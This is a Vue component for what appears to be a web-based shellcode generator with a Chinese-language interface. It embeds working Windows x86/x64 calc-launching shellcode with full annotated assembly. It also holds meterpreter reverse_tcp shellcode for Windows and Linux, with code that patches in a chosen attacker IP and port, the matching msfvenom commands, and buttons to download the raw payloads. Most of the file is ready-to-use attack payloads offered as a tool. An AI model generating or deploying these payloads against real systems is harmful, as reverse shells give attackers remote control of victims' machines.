<template>
    <div>
        <v-container>
            <v-row>
                <v-col :cols="12">
                    <v-card-text>
                        <v-icon color="green">
                            mdi-information
                        </v-icon>
                        一些须知：
                        <ul>
                            <li>纯前端实现，随便造</li>
                            <li>支持最常见Shellcode，如弹计算器、反弹Shell、执行任意命令</li>
                        </ul>
                    </v-card-text>
                    <v-divider></v-divider>
                </v-col>
                <v-col :cols="12">
                    <v-tabs
                        v-model="tab"
                    >
                    <v-tabs-slider color="yellow"></v-tabs-slider>
                    <v-tab>
                        <v-icon class="pr3">mdi-calculator</v-icon>
                        弹计算器
                    </v-tab>
                    <v-tab>
                        <v-icon class="pr3">mdi-console</v-icon>
                        反弹Shell
                    </v-tab>
                    <v-tab>
                        <v-icon class="pr3">mdi-laptop</v-icon>
                        执行命令
                    </v-tab>
                    </v-tabs>
                    <v-divider></v-divider>

                    <v-card-text>
                        <v-tabs-items v-model="tab">
                            <v-tab-item :key="0">
                                <div
                                    v-for="(i, k) in calcs"
                                    :key="k"
                                >
                                    <v-card-title>
                                        <v-icon class="pr5" color="primary">
                                            mdi-chevron-down
                                        </v-icon>
                                        <span class="text-25 text-primary">
                                            {{ i.arch }}
                                        </span>
                                        <v-spacer></v-spacer>
                                        <v-btn
                                            text
                                            color="primary"
                                            @click="downloadHex(i.shellcode)"
                                        >
                                            下载hex
                                        </v-btn>
                                        <v-btn
                                            text
                                            color="primary"
                                            @click="downloadBin(i.shellcode)"
                                        >
                                            下载Bin
                                        </v-btn>
                                        <v-btn
                                            text
                                            color="primary"
                                            @click="copy(i.code)"
                                        >
                                            复制源码
                                        </v-btn>
                                    </v-card-title>
                                    <v-card-text class="text-grey">
                                        {{ i.comment }}
                                    </v-card-text>
                                    <v-card-text>
                                        <v-row>
                                            <v-col :cols="6">
                                                <v-textarea
                                                    v-model="i.shellcode"
                                                    :label="`Shellcode`"
                                                    rows="4"
                                                ></v-textarea>
                                            </v-col>
                                            <v-col :cols="6">
                                                <v-textarea
                                                    v-model="i.code"
                                                    :label="`源码`"
                                                    rows="4"
                                                ></v-textarea>
                                            </v-col>
                                        </v-row>
                                    </v-card-text>
                                </div>
                            </v-tab-item>
                            <v-tab-item :key="1">
                                <v-card-text>
                                    <v-row>
                                        <v-col :cols="6">
                                            <v-text-field
                                                v-model="ip"
                                                label="IP"
                                            ></v-text-field>
                                        </v-col>
                                        <v-col :cols="6">
                                            <v-text-field
                                                v-model.number="port"
                                                label="端口"
                                            ></v-text-field>
                                        </v-col>
                                    </v-row>
                                </v-card-text>
                                <div
                                    v-for="(i, k) in reverse"
                                    :key="k"
                                >
                                    <v-card-title>
                                        <v-icon class="pr5" color="primary">
                                            mdi-chevron-down
                                        </v-icon>
                                        <span class="text-25 text-primary">
                                            {{ i.arch }}
                                        </span>
                                        <v-spacer></v-spacer>
                                        <v-btn
                                            text
                                            color="primary"
                                            @click="downloadHex(i.shellcode(ip, port))"
                                        >
                                            下载hex
                                        </v-btn>
                                        <v-btn
                                            text
                                            color="primary"
                                            @click="downloadBin(i.shellcode(ip, port))"
                                        >
                                            下载Bin
                                        </v-btn>
                                        <v-btn
                                            text
                                            color="primary"
                                            @click="copy(i.code(ip, port))"
                                        >
                                            复制源码
                                        </v-btn>
                                    </v-card-title>
                                    <v-card-text class="text-grey">
                                        {{ i.comment }}
                                    </v-card-text>
                                    <v-card-text>
                                        <v-row>
                                            <v-col :cols="6">
                                                <v-textarea
                                                    :value="i.shellcode(ip, port)"
                                                    :label="`Shellcode`"
                                                    rows="4"
                                                ></v-textarea>
                                            </v-col>
                                            <v-col :cols="6">
                                                <v-textarea
                                                    :value="i.code(ip, port)"
                                                    :label="`源码`"
                                                    rows="4"
                                                ></v-textarea>
                                            </v-col>
                                        </v-row>
                                    </v-card-text>
                                </div>
                            </v-tab-item>
                        </v-tabs-items>
                    </v-card-text>
                </v-col>
            </v-row>
        </v-container>
    </div>
</template>

<script>

export default {
    data : () => ({
        ip : '',
        port : 0,
        cmd : '',
        tab: 0,
        calcs : [
            {
                arch : 'windows/x86',
                shellcode : '89e583ec2031db648b5b308b5b0c8b5b1c8b1b8b1b8b43088945fc8b583c01c38b5b7801c38b7b2001c7897df88b4b2401c1894df48b531c01c28955f08b53148955eceb3231c08b55ec8b7df88b751831c9fc8b3c87037dfc6683c108f3a674054039d072e48b4df48b55f0668b04418b04820345fcc3ba78786563c1ea08526857696e45896518e8b8ffffff31c951682e6578656863616c6389e3415153ffd031c9b901657373c1e908516850726f636845786974896518e887ffffff31d252ffd0',
                comment : 'windows/x86 弹计算器',
                code : `# Title:  Windows\x86 - Null-Free WinExec Calc.exe Shellcode (195 bytes)
# Shellcode Author: Bobby Cooke
# Date: 2020-02-21
# Technique: PEB & Export Directory Table
# Tested On: Windows 10 Pro (x86) 10.0.18363 Build 18363

_start:
; Create a new stack frame
 mov ebp, esp            ; Set base stack pointer for new stack-frame
 sub esp, 0x20           ; Decrement the stack by 32 bytes

; Find kernel32.dll base address
 xor ebx, ebx            ; EBX = 0x00000000
 mov ebx, [fs:ebx+0x30]  ; EBX = Address_of_PEB
 mov ebx, [ebx+0xC]      ; EBX = Address_of_LDR
 mov ebx, [ebx+0x1C]     ; EBX = 1st entry in InitOrderModuleList / ntdll.dll
 mov ebx, [ebx]          ; EBX = 2nd entry in InitOrderModuleList / kernelbase.dll
 mov ebx, [ebx]          ; EBX = 3rd entry in InitOrderModuleList / kernel32.dll
 mov eax, [ebx+0x8]      ; EAX = &kernel32.dll / Address of kernel32.dll
 mov [ebp-0x4], eax      ; [EBP-0x04] = &kernel32.dll

; Find the address of the WinExec Symbol within kernel32.dll
; + The hex values will change with different versions of Windows

; Find the address of the Export Table within kernel32.dll
 mov ebx, [eax+0x3C]     ; EBX = Offset NewEXEHeader  = 0xF8
 add ebx, eax            ; EBX = &NewEXEHeader        = 0xF8 + &kernel32.dll
 mov ebx, [ebx+0x78]     ; EBX = RVA ExportTable      = 0x777B0 = [&NewExeHeader + 0x78]
 add ebx, eax            ; EBX = &ExportTable         = RVA ExportTable + &kernel32.dll

; Find the address of the Name Pointer Table within kernel32.dll
; + Contains pointers to strings of function names - 4-byte/dword entries
 mov edi, [ebx+0x20]     ; EDI = RVA NamePointerTable = 0x790E0
 add edi, eax            ; EDI = &NamePointerTable    = 0x790E0 + &kernel32.dll
 mov [ebp-0x8], edi      ; save &NamePointerTable to stack frame

; Find the address of the Ordinal Table
;   - 2-byte/word entries
 mov ecx, [ebx+0x24]     ; ECX = RVA OrdinalTable     = 0x7A9E8
 add ecx, eax            ; ECX = &OrdinalTable        = 0x7A9E8 + &kernel32.dll
 mov [ebp-0xC], ecx      ; save &OrdinalTable to stack-frame

; Find the address of the Address Table
 mov edx, [ebx+0x1C]     ; EDX = RVA AddressTable     = 0x777CC
 add edx, eax            ; EDX = &AddressTable        = 0x777CC + &kernel32.dll
 mov [ebp-0x10], edx     ; save &AddressTable to stack-frame

; Find Number of Functions within the Export Table of kernel32.dll
 mov edx, [ebx+0x14]     ; EDX = Number of Functions  = 0x642
 mov [ebp-0x14], edx     ; save value of Number of Functions to stack-frame

jmp short functions

findFunctionAddr:
; Initialize the Counter to prevent infinite loop
 xor eax, eax            ; EAX = Counter = 0
 mov edx, [ebp-0x14]     ; get value of Number of Functions from stack-frame
; Loop through the NamePointerTable and compare our Strings to the Name Strings of kernel32.dll
searchLoop:
 mov edi, [ebp-0x8]      ; EDI = &NamePointerTable
 mov esi, [ebp+0x18]     ; ESI = Address of String for the Symbol we are searching for 
 xor ecx, ecx            ; ECX = 0x00000000
 cld                     ; clear direction flag - Process strings from left to right
 mov edi, [edi+eax*4]    ; EDI = RVA NameString      = [&NamePointerTable + (Counter * 4)]
 add edi, [ebp-0x4]      ; EDI = &NameString         = RVA NameString + &kernel32.dll
 add cx, 0x8             ; ECX = len("WinExec,0x00") = 8 = 7 char + 1 Null
 repe cmpsb              ; compare first 8 bytes of [&NameString] to "WinExec,0x00"
 jz found                ; If string at [&NameString] == "WinExec,0x00", then end loop
 inc eax                 ; else Counter ++
 cmp eax, edx            ; Does EAX == Number of Functions?
 jb searchLoop           ;   If EAX != Number of Functions, then restart the loop

found:
; Find the address of WinExec by using the last value of the Counter
 mov ecx, [ebp-0xC]      ; ECX = &OrdinalTable
 mov edx, [ebp-0x10]     ; EDX = &AddressTable
 mov ax,  [ecx + eax*2]  ;  AX = ordinalNumber   = [&OrdinalTable + (Counter*2)]
 mov eax, [edx + eax*4]  ; EAX = RVA WinExec     = [&AddressTable + ordinalNumber]
 add eax, [ebp-0x4]      ; EAX = &WinExec        = RVA WinExec + &kernel32.dll
 ret

functions:
; Create string 'WinExec\\x00' on the stack and save its address to the stack-frame
 mov edx, 0x63657878     ; "cexx"
 shr edx, 8              ; Shifts edx register to the right 8 bits
 push edx                ; "\\x00,cex"
 push 0x456E6957         ; EniW : 456E6957
 mov [ebp+0x18], esp     ; save address of string 'WinExec\\x00' to the stack-frame
 call findFunctionAddr   ; After Return EAX will = &WinExec

; Call WinExec( CmdLine, ShowState );
;   CmdLine   = "calc.exe"
;   ShowState = 0x00000001 = SW_SHOWNORMAL - displays a window
 xor ecx, ecx          ; clear eax register
 push ecx              ; string terminator 0x00 for "calc.exe" string
 push 0x6578652e       ; exe. : 6578652e
 push 0x636c6163       ; clac : 636c6163
 mov ebx, esp          ; save pointer to "calc.exe" string in eax
 inc ecx               ; uCmdShow SW_SHOWNORMAL = 0x00000001
 push ecx              ; uCmdShow  - push 0x1 to stack # 2nd argument
 push ebx              ; lpcmdLine - push string address stack # 1st argument
 call eax              ; Call the WinExec Function

; Create string 'ExitProcess\\x00' on the stack and save its address to the stack-frame
 xor ecx, ecx          ; clear eax register
 mov ecx, 0x73736501     ; 73736501 = "sse",0x01 // "ExitProcess",0x0000 string
 shr ecx, 8              ; ecx = "ess",0x00 // shr shifts the register right 8 bits
 push ecx                ;  sse : 00737365
 push 0x636F7250         ; corP : 636F7250
 push 0x74697845         ; tixE : 74697845
 mov [ebp+0x18], esp     ; save address of string 'ExitProcess\\x00' to stack-frame
 call findFunctionAddr   ; After Return EAX will = &ExitProcess

; Call ExitProcess(ExitCode)
 xor edx, edx
 push edx                ; ExitCode = 0
 call eax                ; ExitProcess(ExitCode)

; nasm -f win32 win32-WinExec_Calc-Exit.asm -o win32-WinExec_Calc-Exit.o
; for i in $(objdump -D win32-WinExec_Calc-Exit.o | grep "^ " | cut -f2); do echo -n '\\x'$i; done; echo
            `
            },
            {
                arch : 'windows/x86-64',
                shellcode : '4831ff48f7e765488b5860488b5b18488b5b20488b1b488b1b488b5b204989d88b5b3c4c01c34831c96681c1ff8848c1e9088b140b4c01c24d31d2448b521c4d01c24d31db448b5a204d01c34d31e4448b62244d01c4eb325b594831c04889e251488b0c244831ff418b3c834c01c74889d6f3a6740548ffc0ebe65966418b0444418b04824c01c053c34831c980c10748b80fa89691ba879a9c48f7d048c1e8085051e8b0ffffff4989c64831c948f7e15048b89c9e939cd19a879a48f7d0504889e148ffc24883ec2041ffd6',
                comment : 'windows/x86-64 弹计算器',
                code : `# Shellcode Title: Windows/x64 - Dynamic Null-Free WinExec PopCalc Shellcode (205 Bytes)
# Shellcode Author: Bobby Cooke (boku)
# Date: 02/05/2021
# Tested on:  Windows 10 v2004 (x64)
# Shellcode Description:
# 64bit Windows 10 shellcode that dynamically resolves the base address of kernel32.dll via PEB & ExportTable method.
# Contains no Null bytes (0x00), and therefor will not crash if injected into typical stack Buffer OverFlow vulnerabilities.
# Grew tired of Windows Defender alerts from MSF code when developing, so built this as a template for development of advanced payloads.

; Compile & get shellcode from Kali:
;   nasm -f win64 popcalc.asm -o popcalc.o
;   for i in $(objdump -D popcalc.o | grep "^ " | cut -f2); do echo -n "\\x$i" ; done
; Get kernel32.dll base address
xor rdi, rdi            ; RDI = 0x0
mul rdi                 ; RAX&RDX =0x0
mov rbx, gs:[rax+0x60]  ; RBX = Address_of_PEB
mov rbx, [rbx+0x18]     ; RBX = Address_of_LDR
mov rbx, [rbx+0x20]     ; RBX = 1st entry in InitOrderModuleList / ntdll.dll
mov rbx, [rbx]          ; RBX = 2nd entry in InitOrderModuleList / kernelbase.dll
mov rbx, [rbx]          ; RBX = 3rd entry in InitOrderModuleList / kernel32.dll
mov rbx, [rbx+0x20]     ; RBX = &kernel32.dll ( Base Address of kernel32.dll)
mov r8, rbx             ; RBX & R8 = &kernel32.dll

; Get kernel32.dll ExportTable Address
mov ebx, [rbx+0x3C]     ; RBX = Offset NewEXEHeader
add rbx, r8             ; RBX = &kernel32.dll + Offset NewEXEHeader = &NewEXEHeader
xor rcx, rcx            ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff
shr rcx, 0x8            ; RCX = 0x88ff --> 0x88
mov edx, [rbx+rcx]      ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
add rdx, r8             ; RDX = &kernel32.dll + RVA ExportTable = &ExportTable

; Get &AddressTable from Kernel32.dll ExportTable
xor r10, r10
mov r10d, [rdx+0x1C]    ; RDI = RVA AddressTable
add r10, r8             ; R10 = &AddressTable

; Get &NamePointerTable from Kernel32.dll ExportTable
xor r11, r11
mov r11d, [rdx+0x20]    ; R11 = [&ExportTable + Offset RVA Name PointerTable] = RVA NamePointerTable
add r11, r8             ; R11 = &NamePointerTable (Memory Address of Kernel32.dll Export NamePointerTable)

; Get &OrdinalTable from Kernel32.dll ExportTable
xor r12, r12
mov r12d, [rdx+0x24]    ; R12 = RVA  OrdinalTable
add r12, r8             ; R12 = &OrdinalTable

jmp short apis

; Get the address of the API from the Kernel32.dll ExportTable
getapiaddr:
pop rbx                 ; save the return address for ret 2 caller after API address is found
pop rcx                 ; Get the string length counter from stack
xor rax, rax            ; Setup Counter for resolving the API Address after finding the name string
mov rdx, rsp            ; RDX = Address of API Name String to match on the Stack 
push rcx                ; push the string length counter to stack
loop:
mov rcx, [rsp]          ; reset the string length counter from the stack
xor rdi,rdi             ; Clear RDI for setting up string name retrieval
mov edi, [r11+rax*4]    ; EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
add rdi, r8             ; RDI = &NameString    = RVA NameString + &kernel32.dll
mov rsi, rdx            ; RSI = Address of API Name String to match on the Stack  (reset to start of string)
repe cmpsb              ; Compare strings at RDI & RSI
je resolveaddr          ; If match then we found the API string. Now we need to find the Address of the API 
incloop:
inc rax
jmp short loop

; Find the address of GetProcAddress by using the last value of the Counter
resolveaddr:
pop rcx                 ; remove string length counter from top of stack
mov ax, [r12+rax*2]     ; RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of kernel32.<API>
mov eax, [r10+rax*4]    ; RAX = RVA API = [&AddressTable + API OrdinalNumber]
add rax, r8             ; RAX = Kernel32.<API> = RVA kernel32.<API> + kernel32.dll BaseAddress
push rbx                ; place the return address from the api string call back on the top of the stack
ret                     ; return to API caller

apis:                   ; API Names to resolve addresses
; WinExec | String length : 7
xor rcx, rcx
add cl, 0x7                 ; String length for compare string
mov rax, 0x9C9A87BA9196A80F ; not 0x9C9A87BA9196A80F = 0xF0,WinExec 
not rax ;mov rax, 0x636578456e6957F0 ; cexEniW,0xF0 : 636578456e6957F0 - Did Not to avoid WinExec returning from strings static analysis
shr rax, 0x8                ; xEcoll,0xFFFF --> 0x0000,xEcoll
push rax
push rcx                    ; push the string length counter to stack
call getapiaddr             ; Get the address of the API from Kernel32.dll ExportTable
mov r14, rax                ; R14 = Kernel32.WinExec Address

; UINT WinExec(
;   LPCSTR lpCmdLine,    => RCX = "calc.exe",0x0
;   UINT   uCmdShow      => RDX = 0x1 = SW_SHOWNORMAL
; );
xor rcx, rcx
mul rcx                     ; RAX & RDX & RCX = 0x0
; calc.exe | String length : 8
push rax                    ; Null terminate string on stack
mov rax, 0x9A879AD19C939E9C ; not 0x9A879AD19C939E9C = "calc.exe"
not rax
;mov rax, 0x6578652e636c6163 ; exe.clac : 6578652e636c6163
push rax                    ; RSP = "calc.exe",0x0
mov rcx, rsp                ; RCX = "calc.exe",0x0
inc rdx                     ; RDX = 0x1 = SW_SHOWNORMAL
sub rsp, 0x20               ; WinExec clobbers first 0x20 bytes of stack (Overwrites our command string when proxied to CreatProcessA)
call r14                    ; Call WinExec("calc.exe", SW_HIDE)`
            }
        ],
        reverse : [
            {
                arch : 'Windows/x86',
                shellcode : (ip, port) => {
                    let origin = 'FCE88F0000006089E531D2648B52308B520C8B52140FB74A268B722831FF31C0AC3C617C022C20C1CF0D01C74975EF528B52108B423C01D08B40785785C0744C01D08B48188B582001D35085C9743C31FF498B348B01D631C0ACC1CF0D01C738E075F4037DF83B7D2475E0588B582401D3668B0C4B8B581C01D38B048B01D0894424245B5B61595A51FFE0585F5A8B12E980FFFFFF5D6833320000687773325F54684C77260789E8FFD0B89001000029C454506829806B00FFD56A0A680B0C0D0E68020004D289E6505050504050405068EA0FDFE0FFD5976A1056576899A57461FFD585C0740AFF4E0875ECE8670000006A006A0456576802D9C85FFFD583F8007E368B366A406800100000566A006858A453E5FFD593536A005653576802D9C85FFFD583F8007D285868004000006A0050680B2F0F30FFD55768756E4D61FFD55E5EFF0C240F8570FFFFFFE99BFFFFFF01C329C675C1C3BBF0B5A2566A0053FFD5'
                    
                    // convert ip to hex
                    let ipHex = ''
                    for (let i of ip.split(/\./)) {
                        const h = parseInt(i).toString(16)
                        // align h to 2 bytes
                        if (h.length < 2) {
                            ipHex += '0' + h
                        } else {
                            ipHex += h
                        }
                    }
                    
                    // replace 0A0A0A0A with iphex
                    origin = origin.replace(/0B0C0D0E/g, ipHex)
                    console.log(ipHex)

                    // convert port to hex
                    let portHex = parseInt(port).toString(16)

                    // align portHex to 4 bytes
                    if (portHex.length < 4) {
                        portHex = '0'.repeat(4 - portHex.length) + portHex
                    }

                    // replace 04d2 with portHex
                    origin = origin.replace(/04D2/g, portHex)

                    return origin
                },
                comment : 'windows/x86 反弹Shell',
                code : (ip, port) => {
                    return `msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -a x86 --platform Windows -f raw`
                }
            },
            {
                arch : 'Windows/x64',
                shellcode : (ip, port) => {
                    let origin = 'FC4883E4F0E8CC00000041514150524831D25165488B5260488B5218488B522056480FB74A4A4D31C9488B72504831C0AC3C617C022C2041C1C90D4101C1E2ED52488B522041518B423C4801D0668178180B020F85720000008B80880000004885C074674801D08B481850448B40204901D0E35648FFC94D31C9418B34884801D64831C0AC41C1C90D4101C138E075F14C034C24084539D175D858448B40244901D066418B0C48448B401C4901D0418B0488415841585E4801D0595A41584159415A4883EC204152FFE05841595A488B12E94BFFFFFF5D49BE7773325F3332000041564989E64881ECA00100004989E549BC020004D20A0A0A0A41544989E44C89F141BA4C772607FFD54C89EA68010100005941BA29806B00FFD56A0A415E50504D31C94D31C048FFC04889C248FFC04889C141BAEA0FDFE0FFD54889C76A1041584C89E24889F941BA99A57461FFD585C0740A49FFCE75E5E8930000004883EC104889E24D31C96A0441584889F941BA02D9C85FFFD583F8007E554883C4205E89F66A404159680010000041584889F24831C941BA58A453E5FFD54889C34989C74D31C94989F04889DA4889F941BA02D9C85FFFD583F8007D2858415759680040000041586A005A41BA0B2F0F30FFD5575941BA756E4D61FFD549FFCEE93CFFFFFF4801C34829C64885F675B441FFE7586A005949C7C2F0B5A256FFD5'

                    // convert ip to hex
                    let ipHex = ''
                    for (let i of ip.split(/\./)) {
                        const h = parseInt(i).toString(16)
                        // align h to 2 bytes
                        if (h.length < 2) {
                            ipHex += '0' + h
                        } else {
                            ipHex += h
                        }
                    }
                    
                    // replace 0A0A0A0A with iphex
                    origin = origin.replace(/0A0A0A0A/g, ipHex)
                    console.log(ipHex)

                    // convert port to hex
                    let portHex = parseInt(port).toString(16)

                    // align portHex to 4 bytes
                    if (portHex.length < 4) {
                        portHex = '0'.repeat(4 - portHex.length) + portHex
                    }

                    // replace 04d2 with portHex
                    origin = origin.replace(/04D2/g, portHex)

                    return origin
                },
                comment : 'Windows/x64 反弹Shell',
                code : (ip, port) => {
                    return `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} --platform Windows -f raw`
                }
            },
            {
                arch : 'Linux/x86',
                shellcode : (ip, port) => {
                    let origin = '6A665850515789E143CD8085C079194E743D68A2000000586A006A0589E331C9CD8085C079BDEB27B207B90010000089E3C1EB0CC1E30CB07DCD8085C078105B89E199B26AB003CD8085C07802FFE1B801000000BB01000000CD80'

                    // convert ip to hex
                    let ipHex = ''
                    for (let i of ip.split(/\./)) {
                        const h = parseInt(i).toString(16)
                        // align h to 2 bytes
                        if (h.length < 2) {
                            ipHex += '0' + h
                        } else {
                            ipHex += h
                        }
                    }
                    
                    // replace 0A0A0A0A with iphex
                    origin = origin.replace(/0A0A0A0A/g, ipHex)
                    console.log(ipHex)

                    // convert port to hex
                    let portHex = parseInt(port).toString(16)

                    // align portHex to 4 bytes
                    if (portHex.length < 4) {
                        portHex = '0'.repeat(4 - portHex.length) + portHex
                    }

                    // replace 04d2 with portHex
                    origin = origin.replace(/04D2/g, portHex)

                    return origin
                },
                comment : 'Linux/x86 反弹Shell',
                code : (ip, port) => {
                    return `msfvenom -p linux/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f raw`
                }
            }
        ]
    }),
    methods : {
        downloadBin(hex) {
            // convert hex to bin
            let bin = []
            for (let i = 0; i < hex.length; i += 2) {
                bin.push(parseInt(hex.substr(i, 2), 16))
            }
            bin = new Uint8Array(bin)
            // download bin
            const blob = new Blob([bin], { type: 'application/octet-stream' })
            const url = URL.createObjectURL(blob)
            const a = document.createElement('a')
            a.href = url
            a.download = 'shellcode.bin'
            a.click()
            URL.revokeObjectURL(url)
        },
        downloadHex(hex) {
            // download hex
            const blob = new Blob([hex], { type: 'application/octet-stream' })
            const url = URL.createObjectURL(blob)
            const a = document.createElement('a')
            a.href = url
            a.download = 'shellcode.hex'
            a.click()
            URL.revokeObjectURL(url)
        },
        copy(code) {
            // copy code
            const input = document.createElement('textarea')
            input.value = code
            document.body.appendChild(input)
            input.select()
            document.execCommand('copy')
            document.body.removeChild(input)
        }
    }
}
</script>

<style>
.rot-item {
    padding: 3px;
}
</style>